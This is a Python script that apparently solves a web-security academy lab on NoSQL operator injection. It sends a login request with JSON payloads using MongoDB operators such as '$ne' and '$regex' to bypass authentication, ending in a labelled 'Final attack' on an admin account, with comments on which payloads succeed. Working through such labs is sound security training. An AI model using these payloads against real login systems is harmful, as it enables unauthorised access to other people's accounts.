# NoSQL injection 12 of 24
# Lab: Exploiting NoSQL operator injection to bypass authentication

import asyncio
from pprint import pprint
from common.base import run_payloads
from urllib.parse import quote_plus as urlencode_str

RAW_REQUEST = """
POST /login HTTP/2
Host: 0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:154.0) Gecko/20100101 Firefox/154.0
Accept: */*
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br, zstd
Referer: https://0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net/login
Content-Type: application/json
Content-Length: 40
Origin: https://0a2a008103cb4a3e80b43fef00e80012.web-security-academy.net
Connection: keep-alive
Cookie: session=Ha7esGXUyCH8IMHEnUZZ3Uvw6CYisbBO
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Pragma: no-cache
Cache-Control: no-cache
TE: trailers

@@@PAYLOAD@@@
""".strip()

async def one_call(raw_req):
    """A simple call. Returns the response"""

    result = await run_payloads(raw_req, [{}], lambda x: True, follow_redirects=True)
    return result

async def print_net_result(raw_req, print_response_body=False):
    result = await one_call(raw_req)
    if result['status_code'] in [200, 302]:
        secs = result['total_seconds']
        print(f" CALL OK, {secs:.2f} secs")
        if print_response_body: pprint(result['full_text'])
        return True, result['full_text']
    else:
        print(" CALL FAILED")
        if print_response_body: pprint(result['full_text'])
        return False, result['full_text']

def xmlencode (text: str) -> str:
    return "".join(f"&#x{ord(c):X};" for c in text)

async def main():

    raw_req_0 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":"wiener","password":"peter"}''')
    print('PLAIN CALL:', end='')
    _, response = await print_net_result(raw_req_0, False)

    # It succeed: it bypasses the username verification and logs in as the first user in the database with this password (wiener?)
    raw_req_3a = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":"peter"}''')
    print('$ne for username:', end='')
    _, response = await print_net_result(raw_req_3a, False)

    # It succeed: regex is supported!
    raw_req_3b = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"wien.*"},"password":"peter"}''')
    print('$regex for username:', end='')
    _, response = await print_net_result(raw_req_3b, False)

    # It fails: Query returns unexpected number of records
    raw_req_3c = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$ne":""},"password":{"$ne":""}}''')
    print('$ne for usr and pwd:', end='')
    _, response = await print_net_result(raw_req_3c, True)

    raw_req_4 = RAW_REQUEST.replace("@@@PAYLOAD@@@", '''{"username":{"$regex":"admin.*"},"password":{"$ne":""}}''')
    print('Final attack:', end='')
    _, response = await print_net_result(raw_req_4, True)

if __name__ == "__main__":
    asyncio.run(main())